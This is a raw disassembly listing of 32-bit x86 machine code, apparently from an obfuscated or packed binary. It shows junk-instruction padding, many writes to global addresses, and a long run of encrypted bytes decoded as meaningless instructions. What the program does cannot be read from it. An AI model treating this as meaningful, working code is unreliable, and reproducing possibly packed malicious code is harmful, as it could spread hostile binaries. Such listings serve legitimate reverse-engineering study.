  412dde:	cmp    DWORD PTR ds:0x4284e1,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42855d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x4284e1,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x428429
  412e17:	xor    DWORD PTR ds:0x428559,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428579
  412e23:	sub    DWORD PTR ds:0x428575,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428575
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428471
  412e38:	adc    DWORD PTR ds:0x428569,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428361,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x428331,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428375,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x428431
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x428339
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428371,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42857d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x1c185215],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	sahf   
  412eb3:	mov    bh,0x63
  412eb5:	xchg   esp,eax
  412eb6:	leave  
  412eb7:	dec    esi
  412eb8:	pop    esi
  412eb9:	mov    bl,BYTE PTR [edx+ecx*1]
  412ebc:	sti    
  412ebd:	lds    ebx,FWORD PTR [edi]
  412ebf:	inc    ebx
  412ec0:	mov    edx,0xbb1b9eb8
  412ec5:	dec    ebx
  412ec6:	add    al,0x95
  412ec8:	daa    
  412ec9:	inc    eax
  412eca:	das    
  412ecb:	lds    edx,FWORD PTR [eax]
  412ecd:	dec    edx
  412ece:	xchg   edx,eax
  412ecf:	mov    ds:0xc33a6f6e,al
  412ed4:	cmp    edi,DWORD PTR [eax*8+0x3bca4359]
  412edb:	mov    ds:0x9fc43adb,al
  412ee0:	stos   DWORD PTR es:[edi],eax
  412ee1:	adc    al,0x61
  412ee3:	shl    ah,0xe1
  412ee6:	sahf   
  412ee7:	mov    dh,0x78
  412ee9:	aaa    
  412eea:	cmp    al,0x72
  412eec:	ror    BYTE PTR [ebp-0x28],0x3f
  412ef0:	arpl   WORD PTR [eax],bx
  412ef2:	rcl    BYTE PTR [edx-0x27],cl
  412ef5:	pop    esi
  412ef6:	jnp    0x412ea5
  412ef8:	cmovp  ebx,DWORD PTR [edx]
  412efb:	push   0xffffff98
  412efd:	fcmovb st,st(3)
  412eff:	push   0x2f3f4519
  412f04:	call   0x76f3:0xa47167a2
  412f0b:	sbb    ebx,edi
  412f0d:	mov    dh,0xc9
  412f0f:	outs   dx,DWORD PTR ds:[esi]
  412f10:	es mov bh,0x87
  412f13:	add    esi,esp
  412f15:	push   es
  412f16:	and    DWORD PTR [esi+ecx*4-0x6e],esi
  412f1a:	jp     0x412f39
  412f1c:	iret   
  412f1d:	pop    ecx
  412f1e:	stos   DWORD PTR es:[edi],eax
  412f1f:	xchg   ecx,eax
  412f20:	xchg   esi,eax
  412f21:	adc    ebx,eax
  412f23:	add    al,0x38
  412f25:	jg     0x412f17
  412f27:	mov    eax,ds:0xee0ec720
  412f2c:	aam    0xf3
  412f2e:	popa   
  412f2f:	sub    dl,BYTE PTR [ebp+0x51f3cb5d]
  412f35:	(bad)
  412f38:	cmp    dl,0x9f
  412f3b:	xor    al,ch
  412f3d:	pop    esi
  412f3e:	push   0xfcbeee88
  412f43:	xor    BYTE PTR [ebp-0x67366303],ch
  412f49:	and    DWORD PTR [ebx+0x10],eax
  412f4c:	xchg   dh,dh
  412f4e:	lods   eax,DWORD PTR ds:[esi]
  412f4f:	outs   dx,DWORD PTR ds:[esi]
  412f50:	loopne 0x412f55
  412f52:	js     0x412eef
  412f54:	out    0x90,al
  412f56:	rep lods eax,DWORD PTR ds:[esi]
  412f58:	inc    edi
  412f59:	push   0xd30789ff
  412f5e:	stos   BYTE PTR es:[edi],al
  412f5f:	jmp    DWORD PTR [eax-0x67bfe87c]
  412f65:	add    eax,0x42097c56
  412f6a:	stos   BYTE PTR es:[edi],al
  412f6b:	push   ebx
  412f6c:	inc    edi
  412f6d:	in     al,dx
  412f6e:	sbb    al,0x99
  412f70:	or     BYTE PTR [esi-0x56],0x50
  412f74:	repnz aam 0x78
  412f77:	jp     0x412f54
  412f79:	xchg   ecx,eax
  412f7a:	sub    al,BYTE PTR [ebx+0xa8069d6]
  412f80:	outs   dx,DWORD PTR ds:[esi]
  412f81:	push   0x46
  412f83:	mov    esp,0x7e1d20b
  412f88:	mov    bl,0xde
  412f8a:	repz xor eax,0x4642cd9a
  412f90:	fdiv   DWORD PTR [edx-0xd777897]
  412f96:	cmp    esi,DWORD PTR [esi-0x78]
  412f99:	cmp    al,0xd0
  412f9b:	hlt    
  412f9c:	out    dx,eax
  412f9d:	pusha  
  412f9e:	dec    ebx
  412f9f:	scas   al,BYTE PTR es:[edi]
  412fa0:	div    DWORD PTR [ebp+eiz*4-0x4d]
  412fa4:	fs ret 0xd934
  412fa8:	out    dx,al
  412fa9:	fcom   st(1)
  412fab:	mov    esi,0x6f5cdad
  412fb0:	and    eax,0x27862eef
  412fb5:	mov    eax,0xd72126e5
  412fba:	push   edx
  412fbb:	repnz sub ah,0x79
  412fbf:	je     0x412f47
  412fc1:	test   BYTE PTR [eax-0x3be6bbfb],ch
  412fc7:	adc    eax,0x4cb080d1
  412fcc:	push   esi
  412fcd:	es imul esp,esp,0xd5043125
  412fd4:	sbb    BYTE PTR [ebx-0x64],dh
  412fd7:	push   edx
  412fd8:	daa    
  412fd9:	cmp    al,0x27
  412fdb:	das    
  412fdc:	sub    BYTE PTR [edi+ebx*1-0x27094891],0x95
  412fe4:	enter  0xf069,0xb7
  412fe8:	and    BYTE PTR [edx],ch
  412fea:	les    eax,FWORD PTR [esi-0x8]
  412fed:	jmp    0x820e:0xea196cda
  412ff4:	mov    ecx,0x84c531a7
  412ff9:	sbb    al,0xe4
  412ffb:	adc    BYTE PTR [ecx+eax*1+0x63],bh
  412fff:	add    dl,0x62
  413002:	pop    ebp
  413003:	int    0x7c
  413005:	shl    DWORD PTR [edi],1
  413007:	jl     0x413085
  413009:	jns    0x41306c
  41300b:	xchg   ebx,eax
  41300c:	pusha  
  41300d:	das    
  41300e:	push   edx
  41300f:	clc    
  413010:	jo     0x412fbc
  413012:	imul   esi,DWORD PTR [edx+0x5b],0x1f
  413016:	jbe    0x412fc2
  413018:	pop    esi
  413019:	mov    ecx,0xd7e86293
  41301e:	adc    BYTE PTR [ebp-0x5],ch
  413021:	popa   
  413022:	inc    edi
  413023:	add    BYTE PTR [edx],dl
  413025:	xor    eax,0x99e375eb
  41302a:	lahf   
  41302b:	adc    eax,0xc7cd1a51
  413030:	cli    
  413031:	xor    al,0xb1
  413033:	cwde   
  413034:	fwait
  413035:	pop    ss
  413036:	das    
  413037:	or     eax,0x31f31fda
  41303c:	fs inc esp
  41303e:	xor    bh,ah
  413040:	sahf   
  413041:	mov    eax,esp
  413043:	push   cs
  413044:	stos   DWORD PTR es:[edi],eax
  413045:	bound  edx,QWORD PTR [ebx-0x5ed995eb]
  41304b:	fcom   QWORD PTR [edx+0x7e]
  41304e:	push   ebx
  41304f:	cli    
  413050:	jg     0x4130c5
  413052:	jecxz  0x41306d
  413054:	enter  0x2a42,0xb1
  413058:	fldenv [ecx+0x21]
  41305b:	pop    ss
  41305c:	in     al,0x5c
  41305e:	push   ebx
  41305f:	or     al,0xfa
  413061:	out    0x0,al
  413063:	xchg   esp,eax
  413064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413065:	rcr    BYTE PTR [edi+ebp*8],1
  413068:	stos   BYTE PTR es:[edi],al
  413069:	add    DWORD PTR [esi-0x2372481d],edi
  41306f:	and    DWORD PTR [edi],ebp
  413071:	sub    BYTE PTR [ecx+0x58],al
  413074:	mov    edx,0x280e3f5a
  413079:	lahf   
  41307a:	(bad)  
  41307c:	scas   al,BYTE PTR es:[edi]
  41307d:	mov    al,ds:0xdee256ae
  413082:	icebp  
  413083:	ficom  DWORD PTR [esi+0x1ae1b44]
  413089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41308a:	cmp    ecx,ebp
  41308c:	dec    esi
  41308d:	jge    0x41306a
  41308f:	add    al,0xb
  413091:	sub    al,0x5
  413093:	or     al,0xb9
  413095:	mov    al,0xff
  413097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413098:	ficom  DWORD PTR [ebx]
  41309a:	loop   0x41308e
  41309c:	jno    0x413022
  41309e:	ds ss dec ebp
  4130a1:	mov    al,ds:0x724c473f
  4130a6:	je     0x413079
  4130a8:	or     al,0x54
  4130aa:	mov    ebp,0x7cb0de
  4130af:	cmp    ebx,DWORD PTR [ebp+0x53344041]
  4130b5:	lods   eax,DWORD PTR ds:[esi]
  4130b6:	mov    BYTE PTR [ecx],al
  4130b8:	popa   
  4130b9:	pop    ds
  4130ba:	(bad)  
  4130bb:	fist   DWORD PTR [eax]
  4130bd:	xor    DWORD PTR [ecx+0x48],0x86e6043e
  4130c4:	add    eax,0x7d460d9c
  4130c9:	sub    al,0xb1
  4130cb:	rcl    DWORD PTR [eax+0x15],cl
  4130ce:	mov    eax,DWORD PTR [edi+ebx*8-0x238660db]
  4130d5:	dec    eax
  4130d6:	in     al,0xf0
  4130d8:	aas    
  4130d9:	enter  0x5721,0x8b
  4130dd:	adc    al,BYTE PTR [ebx]
  4130df:	push   ecx
  4130e0:	and    edx,DWORD PTR [ecx]
  4130e2:	cmp    esp,DWORD PTR [ebp+0x66ea6e30]
  4130e8:	pop    edx
  4130e9:	fbstp  TBYTE PTR [edx+ebx*4+0x33]
  4130ed:	inc    edi
  4130ee:	sub    ebp,DWORD PTR [esi+0x7c8b962c]
  4130f4:	inc    edi
  4130f5:	inc    ebp
  4130f6:	jb     0x41314e
  4130f8:	cmp    edx,DWORD PTR [edi+0x39]
  4130fb:	(bad)  
  4130fd:	push   ebx
  4130fe:	fldcw  WORD PTR cs:0x6f321abf
  413105:	mov    edi,0x658ee164
  41310a:	fadd   QWORD PTR [esi-0x238890d9]
  413110:	xchg   ebx,eax
  413111:	mov    gs,WORD PTR [edi-0x50b50030]
  413117:	out    dx,al
  413118:	xchg   BYTE PTR [esp+eax*1+0x7d],dl
  41311c:	lahf   
  41311d:	mov    ds:0x98a0fe9e,al
  413122:	bound  esi,QWORD PTR [esi-0x45]
  413125:	div    BYTE PTR [edx-0x7]
  413128:	xchg   ecx,eax
  413129:	ins    DWORD PTR es:[edi],dx
  41312a:	mov    eax,0xeda1367e
  41312f:	retf   0xba3c
  413132:	or     eax,DWORD PTR ds:0xf15553ba
  413138:	jne    0x413154
  41313a:	(bad)  
  41313c:	or     BYTE PTR [edi],ch
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	popf   
  413140:	cs cmp bl,cl
  413143:	adc    BYTE PTR [eax-0x3d360f0b],bh
  413149:	xchg   edi,eax
  41314a:	gs pop ebx
  41314c:	outs   dx,DWORD PTR ds:[esi]
  41314d:	shl    DWORD PTR [eax-0x6cb3049b],cl
  413153:	rcl    DWORD PTR [eax],1
  413155:	in     eax,0x5a
  413157:	leave  
  413158:	mov    bl,0x90
  41315a:	inc    ebp
  41315b:	dec    esp
  41315c:	lock jnp 0x4131c0
  41315f:	stc    
  413160:	adc    cl,cl
  413162:	aad    0x6e
  413164:	ret    
  413165:	fdivr  QWORD PTR [ecx+0x17]
  413168:	cdq    
  413169:	(bad)  [ebx]
  41316b:	mov    al,0x4
  41316d:	out    dx,al
  41316e:	or     DWORD PTR [edi],ecx
  413170:	fs mov eax,0x519d1708
  413176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413177:	sbb    al,0x83
  413179:	out    dx,eax
  41317a:	dec    ecx
  41317b:	lods   eax,DWORD PTR ds:[esi]
  41317c:	dec    ecx
  41317d:	es test al,0x32
  413180:	jnp    0x413104
  413182:	mov    edi,0xd4315691
  413187:	mov    ah,0xe8
  413189:	jnp    0x413134
  41318b:	in     al,0x78
  41318d:	mov    bl,0xdf
  41318f:	and    al,0x29
  413191:	aam    0xa9
  413193:	jmp    0x4b915fa8
  413198:	mov    al,0xcb
  41319a:	sbb    eax,DWORD PTR [ecx]
  41319c:	inc    DWORD PTR [edi]
  41319e:	xchg   BYTE PTR [eax+0x39],cl
  4131a1:	mov    BYTE PTR [ebx-0x19],ch
  4131a4:	loope  0x413150
  4131a6:	mov    cs,WORD PTR [ebx+0x24]
  4131a9:	pop    ss
  4131aa:	mov    ds:0x893b2e28,al
  4131af:	popf   
  4131b0:	add    al,ah
  4131b2:	out    0xd6,al
  4131b4:	mov    dh,0x2
  4131b6:	fldcw  WORD PTR ds:0x6c4857cd
  4131bc:	iret   
  4131bd:	lea    ebx,[eax-0x57a174c7]
  4131c3:	js     0x41314d
  4131c5:	das    
  4131c6:	aam    0x1d
  4131c8:	pop    ds
  4131c9:	popa   
  4131ca:	scas   eax,DWORD PTR es:[edi]
  4131cb:	mov    dh,0xe8
  4131cd:	dec    edi
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x428435
  4131d8:	sub    DWORD PTR ds:0x428415,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428365,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	hlt    
  413207:	mov    ?,edx
  413209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41320a:	mov    esp,0xedbebe7e
  41320f:	les    edi,FWORD PTR [esi-0x48c8bf42]
  413215:	xchg   ebx,eax
  413216:	inc    ecx
  413217:	push   0x1e
  413219:	xchg   DWORD PTR [edx-0x58],esp
  41321c:	arpl   WORD PTR [ecx],dx
  41321e:	int    0xae
  413220:	push   0x15
  413222:	dec    eax
  413223:	push   ebp
  413224:	int3   
  413225:	nop
  413226:	adc    edx,DWORD PTR [ecx]
  413228:	inc    edx
  413229:	jb     0x413293
  41322b:	add    BYTE PTR [eax-0x4b],ch
  41322e:	or     BYTE PTR ds:0x89ab7007,0x5a
  413235:	ds out dx,eax
  413237:	sbb    dl,BYTE PTR [edx]
  413239:	cmp    eax,0x642e6368
  41323e:	xlat   BYTE PTR ds:[ebx]
  41323f:	cmp    eax,DWORD PTR [ebx]
  413241:	xchg   BYTE PTR [esi+0x49],dl
  413244:	sbb    edi,ebx
  413246:	gs xchg edi,eax
  413248:	jae    0x413249
  41324a:	sbb    esi,DWORD PTR [ecx+0x386a5e24]
  413250:	mov    ebp,es
  413252:	in     eax,dx
  413253:	jbe    0x4132b9
  413255:	pop    ebx
  413256:	test   DWORD PTR [esi+0x1b],edi
  413259:	or     BYTE PTR [edi+0x0],bl
  41325c:	mov    esp,0x70b314cc
  413261:	adc    BYTE PTR [ebx-0x67f8e7b2],ah
  413267:	fwait
  413268:	in     eax,0x99
  41326a:	call   0xb76c:0xcada5a8e
  413271:	cli    
  413272:	mov    cl,0x43
  413274:	jno    0x413217
  413276:	call   0x7bfb629b
  41327b:	sub    eax,0xe2af64f4
  413280:	inc    esp
  413281:	inc    edx
  413282:	outs   dx,DWORD PTR ds:[esi]
  413283:	adc    bl,BYTE PTR [esi]
  413285:	push   ebp
  413286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413287:	sbb    dl,cl
  413289:	pop    esp
  41328a:	adc    eax,0xa2076c32
  41328f:	jne    0x41323b
  413291:	jb     0x4132c1
  413293:	aam    0x8b
  413295:	and    DWORD PTR [ebx*4-0x209d1003],0x1f
  41329d:	in     eax,dx
  41329e:	in     al,0xac
  4132a0:	cld    
  4132a1:	push   ds
  4132a2:	aaa    
  4132a3:	in     eax,0x76
  4132a5:	loope  0x41326e
  4132a7:	je     0x413289
  4132a9:	dec    esp
  4132aa:	xor    ah,0x1f
  4132ad:	popa   
  4132ae:	cmp    al,0x7e
  4132b0:	and    DWORD PTR [ebx],ebp
  4132b2:	fcmovne st,st(5)
  4132b4:	lock adc al,0x41
  4132b7:	loopne 0x4132a1
  4132b9:	xchg   ebx,eax
  4132ba:	cmp    DWORD PTR ds:0xfc6ff7c0,ebp
  4132c0:	fstp   DWORD PTR [ebp+0xf]
  4132c3:	mov    esi,0x9ceaa4e
  4132c8:	loope  0x413329
  4132ca:	mov    ah,0x6
  4132cc:	adc    DWORD PTR [eax+0x456f2fa9],esi
  4132d2:	add    ebp,edx
  4132d4:	pushf  
  4132d5:	loope  0x413303
  4132d7:	or     DWORD PTR [esi+0x203bba6],0xffffff8a
  4132de:	mov    esi,ss
  4132e0:	jae    0x413360
  4132e2:	iret   
  4132e3:	imul   ebp,DWORD PTR [esi+0x1fdad51a],0xf2f5bde5
  4132ed:	gs adc bl,bh
  4132f0:	mov    cl,0xe9
  4132f2:	out    dx,eax
  4132f3:	bound  ecx,QWORD PTR [ebp+eax*8+0x2e7899cc]
  4132fa:	ins    BYTE PTR es:[edi],dx
  4132fb:	arpl   WORD PTR [edi-0x12],bp
  4132fe:	mov    BYTE PTR ds:0x4773f6e0,cl
  413304:	push   esp
  413305:	jne    0x413334
  413307:	clc    
  413308:	sub    BYTE PTR [ecx-0x79],bh
  41330b:	aas    
  41330c:	mov    al,0x7d
  41330e:	test   al,0x5b
  413310:	mov    edx,DWORD PTR [edi]
  413312:	adc    edi,edx
  413314:	(bad)
  413317:	mov    esi,0xe33176d3
  41331c:	outs   dx,DWORD PTR ds:[esi]
  41331d:	(bad)  
  41331e:	rol    DWORD PTR [esi],cl
  413320:	not    DWORD PTR [edx-0x2e]
  413323:	xchg   edi,eax
  413324:	addr16 jg 0x41333b
  413327:	pushf  
  413328:	add    esp,DWORD PTR [edi]
  41332a:	jmp    0x9185e36
  41332f:	mov    esp,edi
  413331:	leave  
  413332:	mov    al,0xe
  413334:	lahf   
  413335:	adc    bl,BYTE PTR [edx+0x13]
  413338:	not    ecx
  41333a:	and    edi,ebx
  41333c:	fwait
  41333d:	adc    edx,esi
  41333f:	xchg   edi,eax
  413340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413341:	mov    ecx,0x74a7ec0b
  413346:	jne    0x413347
  413348:	xor    bh,BYTE PTR [ebx]
  41334a:	mov    DWORD PTR [ebx],esi
  41334c:	sbb    al,BYTE PTR [edi+0x42e483e]
  413352:	pop    ss
  413353:	clc    
  413354:	ins    BYTE PTR es:[edi],dx
  413355:	or     al,0xd0
  413357:	mov    DWORD PTR [ecx+0x40],eax
  41335a:	dec    ecx
  41335b:	out    dx,eax
  41335c:	iret   
  41335d:	inc    edi
  41335e:	(bad)
  413361:	jb     0x4132f4
  413363:	push   edi
  413364:	mov    eax,0x244c785d
  413369:	jg     0x41338c
  41336b:	fidiv  WORD PTR [ebx]
  41336d:	fisub  DWORD PTR [ecx]
  41336f:	mov    DWORD PTR [edi-0x5a760f60],edi
  413375:	xor    eax,0xee88db48
  41337a:	cmp    al,BYTE PTR [edx-0x7a490e39]
  413380:	mov    ch,0xba
  413382:	mov    ds:0x81f07061,eax
  413387:	adc    esp,DWORD PTR [esp+ebx*4]
  41338a:	push   ebx
  41338b:	mov    bh,0x71
  41338d:	cli    
  41338e:	xor    eax,0x3f5b585c
  413393:	sbb    al,0x33
  413395:	call   0x74c9:0x4246d96f
  41339c:	add    BYTE PTR [edx],al
  41339e:	test   BYTE PTR [ebx],dl
  4133a0:	xlat   BYTE PTR ds:[ebx]
  4133a1:	or     DWORD PTR [eax+ecx*2],0xb6c3bd93
  4133a8:	or     al,0x8f
  4133aa:	mov    dh,0x4a
  4133ac:	outs   dx,DWORD PTR ds:[esi]
  4133ad:	outs   dx,BYTE PTR ds:[esi]
  4133ae:	mov    ebp,0x1d27b38a
  4133b3:	sub    DWORD PTR [ecx],edi
  4133b5:	leave  
  4133b6:	mov    edx,0x30fc4f9e
  4133bb:	lods   al,BYTE PTR ds:[esi]
  4133bc:	inc    ebp
  4133bd:	pop    ecx
  4133be:	cmc    
  4133bf:	pop    es
  4133c0:	xor    eax,0xf3eb973c
  4133c5:	mov    ch,0x27
  4133c7:	(bad)  
  4133c8:	xor    eax,DWORD PTR [esi+0xec183a7]
  4133ce:	rol    BYTE PTR [ecx],0x36
  4133d1:	jo     0x41336c
  4133d3:	ss (bad) 
  4133d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d6:	or     eax,0x7b659060
  4133db:	ds pop ds
  4133dd:	dec    eax
  4133de:	das    
  4133df:	pop    ebx
  4133e0:	sub    edi,DWORD PTR [edx+0x4b8f9ed2]
  4133e6:	adc    al,0x39
  4133e8:	sti    
  4133e9:	lods   eax,DWORD PTR ds:[esi]
  4133ea:	pop    esp
  4133eb:	jg     0x413395
  4133ed:	add    dh,BYTE PTR [ebp+0x1b038dcd]
  4133f3:	fwait
  4133f4:	cdq    
  4133f5:	jge    0x4133e3
  4133f7:	mov    bh,0x6c
  4133f9:	out    dx,al
  4133fa:	hlt    
  4133fb:	xchg   ecx,eax
  4133fc:	inc    ecx
  4133fd:	mov    WORD PTR [eax-0xc4d57b8],fs
  413403:	mov    ebx,0x3c7f0d88
  413408:	jo     0x413453
  41340a:	scas   eax,DWORD PTR es:[edi]
  41340b:	pop    es
  41340c:	loopne 0x413410
  41340e:	pop    ss
  41340f:	and    al,0xa
  413411:	adc    BYTE PTR ds:0x100dd736,dh
  413417:	stos   DWORD PTR es:[edi],eax
  413418:	retf   0xdea9
  41341b:	sub    DWORD PTR [esi-0x467a76db],eax
  413421:	nop    DWORD PTR [esi+esi*8]
  413425:	loop   0x413409
  413427:	fisub  DWORD PTR [ebx]
  413429:	retf   0xc967
  41342c:	push   edi
  41342d:	cwde   
  41342e:	pop    edx
  413430:	jg     0x413407
  413432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413433:	mov    gs,WORD PTR [esi]
  413435:	es ret 0xfbdc
  413439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41343a:	mov    bl,0x74
  41343c:	ficom  DWORD PTR [eax]
  41343e:	xchg   ecx,eax
  41343f:	pop    eax
  413440:	lock xor eax,0x35f96f3d
  413446:	xchg   edi,eax
  413447:	and    ebp,0x27f8d145
  41344d:	and    eax,DWORD PTR [ebp-0xf]
  413450:	loopne 0x413497
  413452:	dec    ebp
  413453:	sti    
  413454:	ds aam 0xd
  413457:	inc    ecx
  413458:	pusha  
  413459:	outs   dx,DWORD PTR ds:[esi]
  41345a:	fdivr  st(7),st
  41345c:	adc    al,0xc5
  41345e:	sbb    eax,0x87f9f80b
  413463:	dec    ecx
  413464:	nop
  413465:	outs   dx,BYTE PTR ds:[esi]
  413466:	push   0xffffff99
  413468:	ret    
  413469:	fadd   DWORD PTR [edi+0x3503dd57]
  41346f:	mov    ch,0x86
  413471:	sbb    dh,ah
  413473:	mov    ds:0xc85911d5,eax
  413478:	xchg   esp,eax
  413479:	jmp    0x413444
  41347b:	jo     0x413462
  41347d:	pushf  
  41347e:	psubb  mm2,QWORD PTR [ebx+0x2b5e6f9]
  413485:	mov    edx,0x6c26ccb4
  41348a:	xlat   BYTE PTR ds:[ebx]
  41348b:	sub    dh,bl
  41348d:	out    0xb7,ax
  413490:	add    ebx,DWORD PTR [edi]
  413492:	mov    bh,0xad
  413494:	dec    edi
  413495:	mov    BYTE PTR [edx-0x2bdefe99],al
  41349b:	mov    ebx,0x27de8d5
  4134a0:	adc    al,0xa7
  4134a2:	jg     0x4134b9
  4134a4:	xchg   ebx,ecx
  4134a6:	add    BYTE PTR [edi-0x16c80638],bl
  4134ac:	jbe    0x41345c
  4134ae:	xor    eax,eax
  4134b0:	fcomp  QWORD PTR gs:[edi]
  4134b3:	sbb    al,0xd6
  4134b5:	adc    bl,BYTE PTR [eax]
  4134b7:	pop    edi
  4134b8:	scas   al,BYTE PTR es:[edi]
  4134b9:	xchg   ebx,eax
  4134ba:	and    ecx,DWORD PTR [esp+edx*8+0x4c]
  4134be:	cmp    bh,0x41
  4134c1:	xor    BYTE PTR [eax+ecx*1-0x73f977ae],ah
  4134c8:	mov    esp,0x4c89b467
  4134cd:	call   0xdceb0de3
  4134d2:	(bad)  
  4134d3:	push   ss
  4134d4:	mov    ah,0x17
  4134d6:	fild   DWORD PTR [esp+ebx*1]
  4134d9:	xchg   BYTE PTR [edx+0x19],dh
  4134dc:	in     eax,0xde
  4134de:	int    0xdd
  4134e0:	inc    edi
  4134e1:	mov    cl,0xaa
  4134e3:	in     al,0x80
  4134e5:	sub    ebx,ecx
  4134e7:	dec    ebx
  4134e8:	add    BYTE PTR [eax],ch
  4134ea:	sub    eax,0x9aec3d13
  4134ef:	xchg   edx,eax
  4134f0:	hlt    
  4134f1:	out    0xfd,al
  4134f3:	in     al,0x20
  4134f5:	dec    edi
  4134f6:	xlat   BYTE PTR ds:[ebx]
  4134f7:	inc    ecx
  4134f8:	std    
  4134f9:	pop    esi
  4134fa:	push   esi
  4134fb:	fisttp WORD PTR [ebx]
  4134fd:	xor    al,0x56
  4134ff:	test   DWORD PTR [ebx],ebp
  413501:	std    
  413502:	push   esp
  413503:	xor    DWORD PTR [ebp+0x390509d4],ebx
  413509:	or     eax,0x38eb0df4
  41350e:	cmp    al,0x9
  413510:	sub    al,bh
  413512:	push   eax
  413513:	inc    esp
  413514:	nop
  413515:	popf   
  413516:	push   eax
  413517:	push   ebp
  413519:	pop    ecx
  41351a:	jne    0x413598
  41351c:	xchg   edx,ecx
  41351e:	icebp  
  41351f:	mov    cl,0xc9
  413521:	mov    esi,0xe0cced08
  413526:	adc    BYTE PTR [esi-0x591932e8],0xde
  41352d:	xchg   edi,eax
  41352e:	or     eax,ecx
  413530:	cmp    DWORD PTR ds:0x428331,0x0
  413537:	mov    DWORD PTR ds:0x428441,0x5b09
  413541:	movzx  ecx,WORD PTR ds:0x428359
  413548:	jmp    0x413626
  41354d:	mov    DWORD PTR ds:0x42836d,0x463b
  413557:	cmp    DWORD PTR ds:0x428331,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428295
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x4284f9,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x428549
  413594:	mov    ecx,DWORD PTR ds:0x4284d9
  41359a:	xor    DWORD PTR ds:0x428565,ecx
  4135a0:	add    DWORD PTR ds:0x4284c5,0x73c1
  4135aa:	xor    DWORD PTR ds:0x4284d1,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x42834d,0x5708
  4135ca:	mov    DWORD PTR ds:0x4284d1,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x42834d
  4135df:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x42842d,edx
  413601:	mov    ecx,DWORD PTR ds:0x428341
  413607:	and    DWORD PTR ds:0x42854d,ecx
  41360d:	and    DWORD PTR ds:0x428355,edx
  413613:	mov    ecx,DWORD PTR ds:0x428421
  413619:	xor    ecx,DWORD PTR ds:0x428451
  41361f:	mov    DWORD PTR ds:0x428421,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x428449,0x0
  413630:	mov    DWORD PTR ds:0x428425,0x7db5
  41363a:	mov    DWORD PTR ds:0x42845d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x428335
  41364b:	mov    eax,ds:0x42843d
  413650:	cmp    DWORD PTR ds:0x428449,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
